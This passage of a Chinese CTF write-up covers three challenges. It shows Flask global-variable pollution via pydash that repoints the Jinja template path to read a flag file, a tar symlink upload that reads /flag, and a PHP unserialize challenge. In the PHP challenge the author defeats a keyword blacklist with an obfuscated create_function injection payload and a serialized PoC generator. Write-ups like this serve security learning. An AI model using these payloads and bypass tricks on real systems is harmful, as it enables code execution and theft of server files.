class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> name</span><br><span class="line">        name=username    </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;user_dashboard&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">int</span>(<span class="built_in">type</span>)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;A272e1739b89da32e983970ece1a086bd&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8080</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>关注到一个路由&#x2F;operate</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span> </span><br></pre></td></tr></table></figure>

<p>这里的话可以修改全局变量，并且参数可控，应该是一个利用点</p>
<p>然后关注到一个路由&#x2F;impression</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br></pre></td></tr></table></figure>

<p>限制的有点狠啊，字符长度只能是5个</p>
<p>这里的话可以看到有渲染，存在ssti，但是从这方面去打估计是不现实的，我们跟进render_template函数看看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>(<span class="params"></span></span><br><span class="line"><span class="params">    template_name_or_list: <span class="built_in">str</span> | Template | <span class="built_in">list</span>[<span class="built_in">str</span> | Template],</span></span><br><span class="line"><span class="params">    **context: t.<span class="type">Any</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Render a template by name with the given context.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param template_name_or_list: The name of the template to render. If</span></span><br><span class="line"><span class="string">        a list is given, the first name to exist will be rendered.</span></span><br><span class="line"><span class="string">    :param context: The variables to make available in the template.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    app = current_app._get_current_object()  <span class="comment"># type: ignore[attr-defined]</span></span><br><span class="line">    template = app.jinja_env.get_or_select_template(template_name_or_list)</span><br><span class="line">    <span class="keyword">return</span> _render(app, template, context)</span><br></pre></td></tr></table></figure>

<p>可以看到参数可以是单个模板文件名，也可以是已编译的模板对象或者模板名称列表，但是这个获取模板的路径是可以改的</p>
<p>jinja_loader.searchpath是 Jinja2 模板加载器中用于指定<strong>模板文件搜索路径</strong>的属性</p>
<p>本地测试一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.jinja_loader.searchpath</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">2333</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>访问后发现会返回当前渲染的目录路径，那我们尝试改路径为根目录，然后point传入flag就可以把flag的内容渲染进去了</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/operate?username=app&amp;password=jinja_loader.searchpath&amp;confirm_password=/</span><br><span class="line"></span><br><span class="line">然后渲染flag</span><br><span class="line">/impression?point=flag</span><br></pre></td></tr></table></figure>

<h1 id="flag？我就借走了（复现）"><a href="#flag？我就借走了（复现）" class="headerlink" title="flag？我就借走了（复现）"></a>flag？我就借走了（复现）</h1><h2 id="软连接"><a href="#软连接" class="headerlink" title="#软连接"></a>#软连接</h2><p>一个文件解压的题，但是没啥思路，也没什么线索</p>
<p>复现：</p>
<p>跟CISCN2023的软连接题目一样，这里也是用符号软连接去打的，但是这个题目明显有点生搬硬套了，一点线索都没有</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /flag link.txt</span><br><span class="line">tar -cvf link.tar link.txt</span><br></pre></td></tr></table></figure>

<p>上传这个tar文件后访问就能出来了</p>
<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><h2 id="RCE"><a href="#RCE" class="headerlink" title="#RCE"></a>#RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$a</span>.<span class="variable">$b</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">            <span class="variable">$b</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">                <span class="variable">$a</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Try again!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$blocked_a</span> = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;escape&#x27;</span>, <span class="string">&#x27;er&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;ay&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;open&#x27;</span>];</span><br><span class="line">        <span class="variable">$blocked_b</span> = [<span class="string">&#x27;find&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;pa&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;alter&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;sy&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pattern_a</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_a</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern_b</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_b</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_a</span>, <span class="variable">$a</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_b</span>, <span class="variable">$b</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$p</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>check有一个黑名单，然后就是<code>$a(&quot;&quot;, $b);</code></p>
<p>这个之前做题接触过，<a href="https://wanth3f1ag.top/2024/11/25/BUGKU-web/?highlight=$a(%22%22,+$b)#unserialize-Noteasy">https://wanth3f1ag.top/2024/11/25/BUGKU-web/?highlight=%24a%28%22%22%2C+%24b%29#unserialize-Noteasy</a></p>
<p><img src="/../image/achieve/202411/ISCTF2025/image-20251204121054789.png" alt="image-20251204121054789"></p>
<p>知道怎么绕过之后我们看看黑名单check函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$blocked_a</span> = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;escape&#x27;</span>, <span class="string">&#x27;er&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;ay&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;open&#x27;</span>];</span><br><span class="line">    <span class="variable">$blocked_b</span> = [<span class="string">&#x27;find&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;pa&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;alter&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;sy&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern_a</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_a</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern_b</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_b</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_a</span>, <span class="variable">$a</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_b</span>, <span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>既然是create_function的话其实就是跟eval没啥区别，$b参数的值就是需要执行的代码，这里过滤太多了，直接打自增吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;create_function&quot;</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;;&#125;\$_=[];\$_=&#x27;&#x27;.\$_;\$_=\$_[&#x27;!&#x27;==&#x27; &#x27;];\$___=\$_;\$__=\$_;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$___=\$__;\$__=\$_;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$___.=\$__;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$___.=\$__;\$__=\$_;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$___.=\$__;\$__++;\$__++;\$__++;\$__++;\$__++;\$___.=\$__;\$__=\$_;\$__++;\$__++;\$__++;\$__++;\$__++;\$___.=\$__;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$___.=\$__;\$___();</span></span><br><span class="line"><span class="string">    /*&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>,<span class="variable">$b</span>))&#123;</span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Try again!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$blocked_a</span> = [<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;escape&#x27;</span>, <span class="string">&#x27;er&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;ay&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;open&#x27;</span>];</span><br><span class="line">        <span class="variable">$blocked_b</span> = [<span class="string">&#x27;find&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;pa&#x27;</span>, <span class="string">&#x27;proc&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;alter&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;sy&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pattern_a</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_a</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern_b</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_b</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_a</span>, <span class="variable">$a</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_b</span>, <span class="variable">$b</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>本地打通了但是远程没打通，不知道为什么</p>
<p>后面发现是我本地改了一下属性的修饰符</p>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span> = <span class="string">&quot;create_function&quot;</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;;&#125;\$_=[];\$_=&#x27;&#x27;.\$_;\$_=\$_[&#x27;!&#x27;==&#x27; &#x27;];\$___=\$_;\$__=\$_;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$___=\$__;\$__=\$_;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$___.=\$__;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$___.=\$__;\$__=\$_;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$___.=\$__;\$__++;\$__++;\$__++;\$__++;\$__++;\$___.=\$__;\$__=\$_;\$__++;\$__++;\$__++;\$__++;\$__++;\$___.=\$__;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$__++;\$___.=\$__;\$___();</span></span><br><span class="line"><span class="string">    /*&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/ISCTF2025/image-20251204131337932.png" alt="image-20251204131337932"></p>
<p>能打通那直接构造就行了，但是不知道为啥我构造ASSERT和EVAL都没成功</p>
<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>使⽤ var_dump 进⾏回显，使⽤反引号执⾏shell命令，⽤通配符代替</p>
